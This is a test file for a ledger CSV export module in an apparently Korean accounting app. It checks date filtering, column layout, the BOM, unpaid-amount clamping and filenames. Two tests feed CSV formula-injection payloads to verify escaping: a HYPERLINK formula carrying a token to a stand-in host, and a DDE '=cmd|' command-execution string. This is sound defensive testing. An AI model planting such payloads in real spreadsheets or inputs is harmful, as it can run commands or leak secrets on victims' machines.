import { describe, expect, it } from "vitest";
import type { DealLedgerEntry } from "@/lib/accounting";
import type { LedgerReportRow } from "@/lib/accounting/report";
import {
  createLedgerCsvExport,
  createLedgerReportCsvExport,
  LEDGER_REPORT_CSV_HEADER,
  safeSpreadsheetCell,
} from "./ledger-csv";

const row = (patch: Partial<DealLedgerEntry> = {}): DealLedgerEntry => ({
  id: "ledger-2",
  dealId: "deal-1",
  kind: "fee",
  amount: 1_500_000,
  receivedAmount: 1_000_000,
  occurredOn: "2026-08-12",
  paidOn: null,
  attributionMonth: "2026-08-01",
  vatIncluded: false,
  taxInvoiceIssued: false,
  ...patch,
});

describe("createLedgerCsvExport", () => {
  it("exports only the inclusive occurrence-date range in a deterministic order", () => {
    const result = createLedgerCsvExport([
      row({ id: "ledger-2" }),
      row({ id: "ledger-1", occurredOn: "2026-08-12", kind: "contract_deposit" }),
      row({ id: "outside", occurredOn: "2026-09-01" }),
    ], { from: "2026-08-01", to: "2026-08-31" });

    expect(result.filename).toBe("업무원장_2026-08-01_2026-08-31.csv");
    expect(result.rowCount).toBe(2);
    expect(result.content).toContain('"ledger-1"');
    expect(result.content.indexOf('"ledger-1"')).toBeLessThan(result.content.indexOf('"ledger-2"'));
    expect(result.content).not.toContain('"outside"');
  });

  it("does not let spreadsheet formulas execute from exported text", () => {
    expect(safeSpreadsheetCell("=HYPERLINK(\"https://example.invalid/?token=secret\")")).toBe(
      "\"'=HYPERLINK(\"\"https://example.invalid/?token=secret\"\")\"",
    );
    expect(safeSpreadsheetCell(" normal")).toBe('" normal"');
  });

  it("rejects an inverted date range", () => {
    expect(() => createLedgerCsvExport([], { from: "2026-09-01", to: "2026-08-31" })).toThrow(
      "from must not be after to",
    );
  });
});

const reportRow = (patch: Partial<LedgerReportRow> = {}): LedgerReportRow => ({
  id: "entry-1",
  dealId: "deal-1",
  companyName: "가나상사",
  assigneeId: "u1",
  assigneeName: "담당A",
  institution: "직접",
  fundName: "혁신성장자금",
  productName: "일반운전자금",
  kind: "fee",
  amount: 5_000_000,
  receivedAmount: 5_500_000,
  occurredOn: "2026-05-20",
  paidOn: "2026-05-20",
  taxInvoiceIssued: true,
  ...patch,
});

describe("createLedgerReportCsvExport — 화면 리포트를 그대로 옮긴다", () => {
  it("열은 화면과 같은 11개 — 내부 ID 는 싣지 않는다", () => {
    const result = createLedgerReportCsvExport([reportRow()], { from: "2026-01-01", to: "2026-06-30" });
    const [header, first] = result.content.split("\r\n");

    expect(header).toBe(`﻿${LEDGER_REPORT_CSV_HEADER.map((cell) => `"${cell}"`).join(",")}`);
    expect(LEDGER_REPORT_CSV_HEADER).toHaveLength(11);
    expect(header).not.toContain("업무 ID");
    expect(first).toBe(
      '"가나상사","담당A","직접","혁신성장자금(일반운전자금)","수수료","2026-05-20","2026-05-20","5000000","5500000","0","발행"',
    );
    expect(result.filename).toBe("정산리포트_2026-01-01_2026-06-30.csv");
    expect(result.rowCount).toBe(1);
  });

  it("BOM 으로 시작한다 — 빼면 엑셀이 한글을 깨뜨린다", () => {
    expect(createLedgerReportCsvExport([], { from: "", to: "" }).content.startsWith("﻿")).toBe(true);
  });

  it("미수금은 entry 단위 max(0, 공급가-입금액) — 초과입금이 음수로 새지 않는다", () => {
    const content = createLedgerReportCsvExport(
      [reportRow({ amount: 3_000_000, receivedAmount: 2_700_000, paidOn: null, taxInvoiceIssued: false })],
      { from: "", to: "" },
    ).content;
    expect(content).toContain('"300000"');
    // 음수가 새면 셀이 `"-…"` 로 시작한다(날짜의 «-» 와 헷갈리지 않게 따옴표까지 본다).
    expect(content).not.toContain('"-');
  });

  it("보드 값이 비면 빈 칸으로 나간다(오류가 아니다)", () => {
    const content = createLedgerReportCsvExport(
      [reportRow({ institution: null, fundName: null, productName: null, assigneeName: null })],
      { from: "", to: "" },
    ).content;
    // null 은 따옴표 없는 «빈 칸» 으로 나간다(safeSpreadsheetCell 의 기존 규약 그대로 —
    // 기존 내보내기의 입금일 null 과 같은 모양이다). 「데이터 없음」 같은 글자를 넣지 않는다.
    expect(content).toContain('"가나상사","미지정",,,"수수료"');
  });

  it("사용자 입력이 수식으로 실행되지 않는다 — 업체명도 셀이다", () => {
    const content = createLedgerReportCsvExport(
      [reportRow({ companyName: "=cmd|'/c calc'!A1" })],
      { from: "", to: "" },
    ).content;
    expect(content).toContain("\"'=cmd|'/c calc'!A1\"");
  });

  it("기간을 안 고르면 파일명이 «전체» 다", () => {
    expect(createLedgerReportCsvExport([], { from: "", to: "" }).filename).toBe("정산리포트_전체.csv");
    expect(createLedgerReportCsvExport([], { from: "2026-01-01", to: "" }).filename)
      .toBe("정산리포트_2026-01-01_오늘.csv");
  });

  it("뒤집힌 기간은 거절한다 — 화면이 막아도 여기서 한 번 더 막는다", () => {
    expect(() => createLedgerReportCsvExport([], { from: "2026-09-01", to: "2026-08-31" })).toThrow(
      "from must not be after to",
    );
  });
});
